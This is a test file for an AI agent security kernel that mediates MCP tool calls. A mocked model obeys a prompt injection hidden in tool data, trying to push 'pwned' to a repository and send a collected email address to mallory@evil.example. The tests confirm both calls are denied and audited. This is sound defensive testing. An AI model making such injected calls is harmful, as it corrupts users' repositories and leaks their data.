/**
 * End-to-end check that dynamic-list resolution is mediated by the security
 * kernel (regression test for the unmediated resolver: PIP-1 / DOM-1).
 *
 * Exercises the real path, with only the LLM and the backend faked:
 *
 *   resolveList (function-form MockLanguageModelV3)
 *     -> bridged AI SDK tools
 *     -> connectViaProxy's ToolCallCoordinator (bundled read-only policy,
 *        bundled tool annotations, escalations denied, audit log)
 *     -> real mcp-proxy-server relay subprocess (SERVER_FILTER=github)
 *     -> fake stdio backend (test/fixtures/list-source-mcp-server.mjs)
 *
 * The backend exposes a read tool, a mutating tool and an unannotated tool,
 * and records every call it receives. The model follows the injected text
 * in the read tool's data and tries both other tools; both calls must be
 * refused by the kernel, audited, and never reach the backend. A second
 * backend flavor checks that the caller's protected paths apply and that no
 * sandbox directory is auto-writable.
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { MockLanguageModelV3 } from 'ai/test';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  buildRelayEnv,
  connectViaProxy,
  LIST_RESOLUTION_AUDIT_FILENAME,
  type ListResolutionMcpOptions,
  type MediatedMcpConnection,
} from '../src/pipeline/proxy-mcp-connections.js';
import { resolveList } from '../src/pipeline/list-resolver.js';
import type { ListDefinition } from '../src/pipeline/types.js';
import type { AuditEntry } from '../src/types/audit.js';
import type { MCPServerConfig } from '../src/config/types.js';
import {
  LIST_SOURCE_BACKEND_PATH as backendPath,
  listSourceBackend as fakeBackend,
  readJsonl,
  type ListSourceBackendRecord as BackendRecord,
} from './fixtures/list-source-backend.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const bundledGeneratedDir = resolve(__dirname, '..', 'src', 'config', 'generated');

const issueReporters: ListDefinition = {
  name: 'issue-reporters',
  type: 'emails',
  principle: 'Allow emailing people who reported issues',
  generationPrompt: 'List the email addresses of everyone who reported an issue in acme/widgets.',
  requiresMcp: true,
  mcpServerHint: 'github',
};

const fakeGithub: Record<string, MCPServerConfig> = {
  github: { command: process.execPath, args: [backendPath], sandbox: false },
};

/**
 * Runs `fn` with `os.tmpdir()` pointing at `dir`, so the relay's throwaway
 * ALLOWED_DIRECTORY (`ironcurtain-list-resolution-*`) is created there and
 * can be found from this side; the backend no longer sees the relay's
 * configuration, so it cannot report it.
 */
async function withTmpdir<T>(dir: string, fn: () => Promise<T>): Promise<T> {
  const saved = process.env.TMPDIR;
  process.env.TMPDIR = dir;
  try {
    return await fn();
  } finally {
    if (saved === undefined) delete process.env.TMPDIR;
    else process.env.TMPDIR = saved;
  }
}

/** The relay's scratch directory created under `dir` by {@link withTmpdir}. */
function relayScratchDir(dir: string): string {
  const entries = readdirSync(dir).filter((name) => name.startsWith('ironcurtain-list-resolution-'));
  expect(entries).toHaveLength(1);
  return join(dir, entries[0]);
}

const USAGE = {
  inputTokens: { total: 1, noCache: 1, cacheRead: 0, cacheWrite: 0 },
  outputTokens: { total: 1, text: 1, reasoning: 0 },
};

function toolCallStep(toolCallId: string, toolName: string, input: Record<string, unknown>) {
  return {
    content: [{ type: 'tool-call' as const, toolCallId, toolName, input: JSON.stringify(input) }],
    finishReason: { unified: 'tool-calls' as const, raw: 'tool_use' },
    usage: USAGE,
    warnings: [],
  };
}

function textStep(text: string) {
  return {
    content: [{ type: 'text' as const, text }],
    finishReason: { unified: 'stop' as const, raw: 'stop' },
    usage: USAGE,
    warnings: [],
  };
}

/**
 * Inherited variables that would turn the relay into a socket/TCP listener
 * (or a virtual proxy-tool relay) instead of a plain stdio relay for one
 * backend. connectViaProxy must strip them.
 */
const RELAY_CONTROL_VARS = [
  'PROXY_SOCKET_PATH',
  'PROXY_TCP_PORT',
  'PROXY_PORT_FILE',
  'MITM_CONTROL_ADDR',
  'MITM_CONTROL_TOKEN',
  'BACKEND_CALL_TIMEOUT_MS',
] as const;

/** The variables a relay resolves its OS-sandbox policy from, highest precedence first. */
const SANDBOX_POLICY_VARS = ['IRONCURTAIN_SANDBOX_POLICY', 'SANDBOX_POLICY'] as const;

describe('dynamic-list resolution through the security kernel', { timeout: 60_000 }, () => {
  let workDir: string;
  let callLogPath: string;
  let auditLogPath: string;
  let scratchDir: string;
  let connection: MediatedMcpConnection | undefined;
  const savedEnv = {
    hostCanary: process.env.LIST_SOURCE_HOST_CANARY,
    allowedDirectory: process.env.ALLOWED_DIRECTORY,
  };
  const savedRelayControl = Object.fromEntries(RELAY_CONTROL_VARS.map((name) => [name, process.env[name]]));

  const backendCalls = () => readJsonl<BackendRecord>(callLogPath).filter((r) => r.event === 'call');
  const auditEntries = () => readJsonl<AuditEntry>(auditLogPath);

  beforeAll(async () => {
    workDir = mkdtempSync(join(tmpdir(), 'ironcurtain-list-mediation-'));
    callLogPath = join(workDir, 'backend-calls.jsonl');
    auditLogPath = join(workDir, 'generated', LIST_RESOLUTION_AUDIT_FILENAME);
    writeFileSync(callLogPath, '');

    // A host-only secret: neither the relay nor the backend may inherit it.
    process.env.LIST_SOURCE_HOST_CANARY = 'host-secret';
    // A real directory in the parent environment must not become the
    // relay's sandbox directory.
    process.env.ALLOWED_DIRECTORY = workDir;
    // Nor may inherited relay-control variables reach the relay. (The two
    // that switch its transport to a socket are covered by the buildRelayEnv
    // unit test below: through a real relay they would hang, not fail.)
    process.env.PROXY_PORT_FILE = join(workDir, 'relay.port');
    process.env.MITM_CONTROL_ADDR = 'http://127.0.0.1:9';
    // A malformed backend call bound would stop the relay if inherited.
    process.env.BACKEND_CALL_TIMEOUT_MS = 'not-a-number';

    connection = await withTmpdir(workDir, () =>
      connectViaProxy([issueReporters], {
        mcpServers: { github: fakeBackend(callLogPath) },
        toolAnnotationsDir: bundledGeneratedDir,
        protectedPaths: [],
        auditLogPath,
      }),
    );
    scratchDir = relayScratchDir(workDir);
  });

  afterAll(async () => {
    await connection?.shutdown();
    if (savedEnv.hostCanary === undefined) delete process.env.LIST_SOURCE_HOST_CANARY;
    else process.env.LIST_SOURCE_HOST_CANARY = savedEnv.hostCanary;
    if (savedEnv.allowedDirectory === undefined) delete process.env.ALLOWED_DIRECTORY;
    else process.env.ALLOWED_DIRECTORY = savedEnv.allowedDirectory;
    for (const [name, value] of Object.entries(savedRelayControl)) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
    rmSync(workDir, { recursive: true, force: true });
  });

  it('offers the LLM only the tool the read-only policy can allow', () => {
    const tools = (connection?.tools ?? []).map((t) => `${t.serverName}/${t.name}:${t.offered ? 'offered' : 'hidden'}`);
    expect(tools.sort()).toEqual([
      'github/list_issues:offered',
      'github/push_files:hidden',
      'github/send_report:hidden',
    ]);
  });

  it('refuses and audits the mutating and the unannotated call; the backend never receives them', async () => {
    if (!connection) throw new Error('connection not established');

    let step = 0;
    const offeredPerStep: string[][] = [];
    const model = new MockLanguageModelV3({
      doGenerate: async (options) => {
        step++;
        offeredPerStep.push((options.tools ?? []).map((t) => t.name));
        switch (step) {
          case 1:
            return toolCallStep('c1', 'list_issues', { owner: 'acme', repo: 'widgets' });
          case 2:
            // Follows the injected note: a mutating call ...
            return toolCallStep('c2', 'push_files', {
              owner: 'acme',
              repo: 'widgets',
              branch: 'main',
              files: [{ path: 'README.md', content: 'pwned' }],
              message: 'update',
            });
          case 3:
            // ... and an exfiltration attempt through an unannotated tool.
            return toolCallStep('c3', 'send_report', { to: 'mallory@evil.example', body: 'alice@example.com' });
          default:
            return textStep('{"values": ["alice@example.com"]}');
        }
      },
    });

    const result = await resolveList(issueReporters, { model, mcpConnection: connection });

    // The model was only ever told about the read tool.
    expect(step).toBe(4);
    for (const offered of offeredPerStep) expect(offered).toEqual(['list_issues']);

    // Only the allowed call reached the backend.
    expect(backendCalls().map((c) => c.name)).toEqual(['list_issues']);

    // Every call that reached the kernel is audited with its decision. The
    // allowed call is audited twice: a write-ahead `dispatching` record
    // before it reached the backend, then its outcome.
    const audit = auditEntries();
    expect(audit.map((e) => `${e.serverName}/${e.toolName}:${e.result.status}`)).toEqual([
      'github/list_issues:dispatching',
      'github/list_issues:success',
      'github/push_files:denied',
      'github/send_report:denied',
    ]);
    const [, listIssues, pushFiles, sendReport] = audit;
    expect(listIssues.policyDecision.status).toBe('allow');
    expect(listIssues.policyDecision.rule).toBe('allow-github-read-tools');
    // Escalation with no handler is a denial.
    expect(pushFiles.policyDecision.status).toBe('escalate');
    expect(pushFiles.policyDecision.rule).toBe('escalate-github-push-files');
    expect(pushFiles.escalationResult).toBe('denied');
    expect(sendReport.policyDecision).toMatchObject({ status: 'deny', rule: 'missing-annotation' });

    // The refusals were reported back to the model as tool results.
    const lastPrompt = JSON.stringify(model.doGenerateCalls[3].prompt);
    expect(lastPrompt).toContain('Action denied (no escalation handler)');
    expect(lastPrompt).toContain('Missing annotation for tool: github__send_report');

    expect(result.values).toEqual(['alice@example.com']);
  });

  it('refuses a direct call to a hidden tool the same way', async () => {
    if (!connection) throw new Error('connection not established');
    const before = backendCalls().length;

    const response = await connection.callTool('github', 'push_files', {
      owner: 'acme',
      repo: 'widgets',
      branch: 'main',
      files: [],
      message: 'x',
    });

    expect(response.isError).toBe(true);
    expect(backendCalls()).toHaveLength(before);
    expect(auditEntries().at(-1)).toMatchObject({ toolName: 'push_files', result: { status: 'denied' } });
  });

  it('hands the backend neither the relay configuration nor the host environment', () => {
    // The relay-control variables never reached the relay (it speaks stdio,
    // not the port file), and the backend saw none of the relay's own
    // variables and not the host-only canary.
    const startup = readJsonl<BackendRecord>(callLogPath).find((r) => r.event === 'startup');
    expect(startup).toBeDefined();
    expect(startup?.relayInternalVars).toEqual([]);
    expect(startup?.hostCanary).toBeNull();
    expect(existsSync(join(workDir, 'relay.port'))).toBe(false);
  });

  it('runs the relay with its own throwaway directory and removes it on shutdown', async () => {
    if (!connection) throw new Error('connection not established');
    expect(scratchDir).not.toBe(workDir);
    expect(existsSync(scratchDir)).toBe(true);

    await connection.shutdown();
    expect(existsSync(scratchDir)).toBe(false);
  });
});

describe('dynamic-list resolution: protected paths and no sandbox', { timeout: 60_000 }, () => {
  let workDir: string;
  let callLogPath: string;
  let auditLogPath: string;
  let protectedDir: string;
  let scratchDir: string;
  let connection: MediatedMcpConnection | undefined;

  const backendCalls = () => readJsonl<BackendRecord>(callLogPath).filter((r) => r.event === 'call');
  const lastAudit = () => readJsonl<AuditEntry>(auditLogPath).at(-1);

  beforeAll(async () => {
    workDir = realpathSync(mkdtempSync(join(tmpdir(), 'ironcurtain-list-mediation-fs-')));
    callLogPath = join(workDir, 'backend-calls.jsonl');
    auditLogPath = join(workDir, LIST_RESOLUTION_AUDIT_FILENAME);
    protectedDir = join(workDir, 'protected');
    mkdirSync(protectedDir);
    writeFileSync(join(protectedDir, 'secret.txt'), 'secret');
    writeFileSync(join(workDir, 'contacts.txt'), 'bob@example.org');
    writeFileSync(callLogPath, '');

    connection = await withTmpdir(workDir, () =>
      connectViaProxy([{ ...issueReporters, name: 'file-contacts', mcpServerHint: 'filesystem' }], {
        mcpServers: { filesystem: fakeBackend(callLogPath, 'filesystem') },
        toolAnnotationsDir: bundledGeneratedDir,
        protectedPaths: [protectedDir],
        auditLogPath,
      }),
    );
    scratchDir = relayScratchDir(workDir);
  });

  afterAll(async () => {
    await connection?.shutdown();
    rmSync(workDir, { recursive: true, force: true });
  });

  it('allows a read outside the protected paths', async () => {
    if (!connection) throw new Error('connection not established');
    expect(connection.tools.map((t) => `${t.name}:${t.offered ? 'offered' : 'hidden'}`).sort()).toEqual([
      'read_text_file:offered',
      'write_file:hidden',
    ]);

    const response = await connection.callTool('filesystem', 'read_text_file', { path: join(workDir, 'contacts.txt') });

    expect(response.isError).toBe(false);
    expect(backendCalls().map((c) => c.name)).toEqual(['read_text_file']);
  });

  it('refuses a read of a protected path before it reaches the backend', async () => {
    if (!connection) throw new Error('connection not established');
    const before = backendCalls().length;

    const response = await connection.callTool('filesystem', 'read_text_file', {
      path: join(protectedDir, 'secret.txt'),
    });

    expect(response.isError).toBe(true);
    expect(backendCalls()).toHaveLength(before);
    expect(lastAudit()).toMatchObject({
      toolName: 'read_text_file',
      policyDecision: { status: 'deny', rule: 'structural-protected-path' },
      result: { status: 'denied' },
    });
  });

  it("refuses a write even into the relay's scratch directory (no sandbox fast-path)", async () => {
    if (!connection) throw new Error('connection not established');

    const response = await connection.callTool('filesystem', 'write_file', {
      path: join(scratchDir, 'planted.txt'),
      content: 'x',
    });

    expect(response.isError).toBe(true);
    expect(backendCalls().some((c) => c.name === 'write_file')).toBe(false);
    expect(lastAudit()).toMatchObject({
      toolName: 'write_file',
      policyDecision: { status: 'escalate', rule: 'escalate-write-file' },
      escalationResult: 'denied',
      result: { status: 'denied' },
    });
  });
});

describe("dynamic-list resolution: the user's sandboxPolicy from config.json", { timeout: 60_000 }, () => {
  let workDir: string;
  let callLogPath: string;
  let connection: MediatedMcpConnection | undefined;
  const saved = Object.fromEntries(
    ['IRONCURTAIN_HOME', ...SANDBOX_POLICY_VARS].map((name) => [name, process.env[name]]),
  );

  beforeAll(async () => {
    workDir = mkdtempSync(join(tmpdir(), 'ironcurtain-list-mediation-policy-'));
    callLogPath = join(workDir, 'backend-calls.jsonl');
    writeFileSync(callLogPath, '');

    // "enforce" comes from config.json alone; nothing in the environment
    // names a policy. (That the relay is handed the resolved policy under
    // both variable names is the buildRelayEnv unit test below: the backend
    // no longer sees the relay's variables, so it cannot report them.)
    const home = join(workDir, 'home');
    mkdirSync(home);
    writeFileSync(join(home, 'config.json'), JSON.stringify({ sandboxPolicy: 'enforce' }), { mode: 0o600 });
    process.env.IRONCURTAIN_HOME = home;
    for (const name of SANDBOX_POLICY_VARS) delete process.env[name];

    connection = await connectViaProxy([issueReporters], {
      mcpServers: { github: fakeBackend(callLogPath) },
      toolAnnotationsDir: bundledGeneratedDir,
      protectedPaths: [],
      auditLogPath: join(workDir, LIST_RESOLUTION_AUDIT_FILENAME),
    });
  });

  afterAll(async () => {
    await connection?.shutdown();
    for (const [name, value] of Object.entries(saved)) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
    rmSync(workDir, { recursive: true, force: true });
  });

  it('starts the opted-out server under "enforce" and hands the backend no policy variables', () => {
    const startup = readJsonl<BackendRecord>(callLogPath).find((r) => r.event === 'startup');
    expect(startup?.relayInternalVars).toEqual([]);
    // The server opts out of the OS sandbox, so "enforce" does not stop it.
    expect((connection?.tools ?? []).map((t) => t.name).sort()).toEqual(['list_issues', 'push_files', 'send_report']);
  });
});

describe('buildRelayEnv', () => {
  const inherited = {
    ALLOWED_DIRECTORY: '/home/user/real-sandbox',
    SERVER_CREDENTIALS: JSON.stringify({ OTHER_SERVER_TOKEN: 'other' }),
    SERVER_FILTER: 'filesystem',
    PROXY_SOCKET_PATH: '/tmp/hijack.sock',
    PROXY_TCP_PORT: '0',
    PROXY_PORT_FILE: '/tmp/hijack.port',
    MITM_CONTROL_ADDR: 'http://127.0.0.1:9',
    // The MITM control API's per-bundle token must never reach a list relay.
    MITM_CONTROL_TOKEN: 'inherited-control-token',
    // Malformed: the relay would refuse to start with it.
    BACKEND_CALL_TIMEOUT_MS: '60s',
    // A weaker OS-sandbox policy than the one resolved for the user.
    IRONCURTAIN_SANDBOX_POLICY: 'warn',
    SANDBOX_POLICY: 'warn',
    // Host-only variables: a secret, and a token one server declares with -e.
    LIST_RESOLUTION_ENV_PROBE: 'host-only',
    LIST_RESOLUTION_HOST_TOKEN: 'ghp_host',
    SSH_AUTH_SOCK: '/run/user/1000/ssh-agent.sock',
    // Where the user moved the credential stores the relay hides from
    // sandboxed servers (relay-only settings, not on the allowlist).
    ANTHROPIC_CONFIG_DIR: '/data/anthropic-cli',
    CODEX_HOME: '/data/codex',
  };
  const saved = Object.fromEntries(Object.keys(inherited).map((name) => [name, process.env[name]]));

  beforeAll(() => {
    Object.assign(process.env, inherited);
  });

  afterAll(() => {
    for (const [name, value] of Object.entries(saved)) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
  });

  it('starts a plain stdio relay for exactly one backend, whatever the parent environment holds', () => {
    const env = buildRelayEnv(
      'github',
      fakeGithub.github,
      '/annotations',
      { GITHUB_PERSONAL_ACCESS_TOKEN: 'token' },
      '/tmp/scratch',
      'enforce',
    );

    // Relay-control variables never reach the relay: with them it would
    // listen on a socket or port instead of speaking stdio to us.
    for (const name of RELAY_CONTROL_VARS) expect(env).not.toHaveProperty(name);
    // The variables the relay acts on are set explicitly, overriding
    // anything inherited.
    expect(env.SERVER_FILTER).toBe('github');
    expect(JSON.parse(env.MCP_SERVERS_CONFIG)).toEqual({ github: fakeGithub.github });
    expect(env.ALLOWED_DIRECTORY).toBe('/tmp/scratch');
    expect(JSON.parse(env.SERVER_CREDENTIALS)).toEqual({ GITHUB_PERSONAL_ACCESS_TOKEN: 'token' });
    expect(env.TOOL_ANNOTATIONS_DIR).toBe('/annotations');
    // Only the allowlist is inherited, as for session relays: the system
    // variables and the ssh-agent socket (for a git backend), never an
    // arbitrary host variable, nor a token this server does not declare.
    expect(env.PATH).toBe(process.env.PATH);
    expect(env.SSH_AUTH_SOCK).toBe('/run/user/1000/ssh-agent.sock');
    expect(env).not.toHaveProperty('LIST_RESOLUTION_ENV_PROBE');
    expect(env).not.toHaveProperty('LIST_RESOLUTION_HOST_TOKEN');
    // The relay builds its backends' srt denyRead baseline from these, so it
    // must hide the credential stores where they really are.
    expect(env.ANTHROPIC_CONFIG_DIR).toBe('/data/anthropic-cli');
    expect(env.CODEX_HOME).toBe('/data/codex');
  });

  it("forwards the host values of the server's own `-e NAME` arguments", () => {
    const declaring: MCPServerConfig = {
      command: 'docker',
      args: ['run', '-i', '--rm', '-e', 'LIST_RESOLUTION_HOST_TOKEN', 'ghcr.io/example/server'],
      sandbox: false,
    };
    const env = buildRelayEnv('github', declaring, '/annotations', undefined, '/tmp/scratch', 'enforce');
    expect(env.LIST_RESOLUTION_HOST_TOKEN).toBe('ghp_host');
    expect(env).not.toHaveProperty('LIST_RESOLUTION_ENV_PROBE');
  });

  it('sends no credentials when the server has none configured', () => {
    const env = buildRelayEnv('github', fakeGithub.github, '/annotations', undefined, '/tmp/scratch', 'enforce');
    expect(JSON.parse(env.SERVER_CREDENTIALS)).toEqual({});
  });

  it('carries explicit credential-store path metadata to a list relay', () => {
    const env = buildRelayEnv(
      'github',
      fakeGithub.github,
      '/annotations',
      undefined,
      '/tmp/scratch',
      'enforce',
      undefined,
      ['/configured/extra-store'],
    );
    expect(JSON.parse(env.SANDBOX_CREDENTIAL_PATHS)).toEqual(['/configured/extra-store']);
  });

  it("hands the relay the user's resolved sandbox policy under both names, never a hard-coded one", () => {
    // The relay resolves IRONCURTAIN_SANDBOX_POLICY first, then
    // SANDBOX_POLICY: both must carry the resolved value, so neither an
    // inherited "warn" nor a fixed default can relax "enforce".
    const enforce = buildRelayEnv('github', fakeGithub.github, '/annotations', undefined, '/tmp/scratch', 'enforce');
    expect(enforce.IRONCURTAIN_SANDBOX_POLICY).toBe('enforce');
    expect(enforce.SANDBOX_POLICY).toBe('enforce');

    const warn = buildRelayEnv('github', fakeGithub.github, '/annotations', undefined, '/tmp/scratch', 'warn');
    expect(warn.IRONCURTAIN_SANDBOX_POLICY).toBe('warn');
    expect(warn.SANDBOX_POLICY).toBe('warn');
  });
});

describe('connectViaProxy list scoping', () => {
  const options: ListResolutionMcpOptions = {
    mcpServers: { ...fakeGithub, fetch: { command: 'false', args: [], sandbox: false } },
    toolAnnotationsDir: bundledGeneratedDir,
    protectedPaths: [],
    auditLogPath: join(tmpdir(), 'ironcurtain-list-scoping-unused.jsonl'),
  };

  it('refuses a data-backed list that names no server, instead of connecting every server', async () => {
    const unhinted: ListDefinition = { ...issueReporters, mcpServerHint: undefined };
    await expect(connectViaProxy([unhinted], options)).rejects.toThrow(/no mcpServerHint/);
  });

  it('refuses a list backed by the network-fetch server', async () => {
    await expect(connectViaProxy([{ ...issueReporters, mcpServerHint: 'fetch' }], options)).rejects.toThrow(
      /network server "fetch"/,
    );
  });

  it('refuses a server the caller has not configured', async () => {
    await expect(connectViaProxy([{ ...issueReporters, mcpServerHint: 'google-workspace' }], options)).rejects.toThrow(
      /"google-workspace", which is not configured/,
    );
  });
});
